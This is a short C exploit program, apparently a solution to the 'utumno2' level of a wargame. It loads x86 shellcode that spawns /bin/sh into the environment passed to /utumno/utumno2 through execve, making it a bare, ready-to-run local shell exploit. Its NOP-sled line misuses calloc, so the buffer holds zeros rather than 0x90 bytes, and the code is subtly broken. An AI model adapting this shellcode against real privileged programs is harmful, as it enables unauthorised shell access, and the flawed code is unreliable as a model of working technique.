#include <stdio.h>
#include <unistd.h>

int main()
{
	int i;
	char *env[11];
	
	char *nop = (char*)calloc(sizeof(char)*1000, 0x90);
	
	for(i=0;i<10;i++)
		env[i] = nop;
	
	env[9]="\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\xeb\x0f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x14\xde\xff\xff\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
	env[10] = 0;
	
	execve("/utumno/utumno2", NULL, env);
	
	return 0;
}

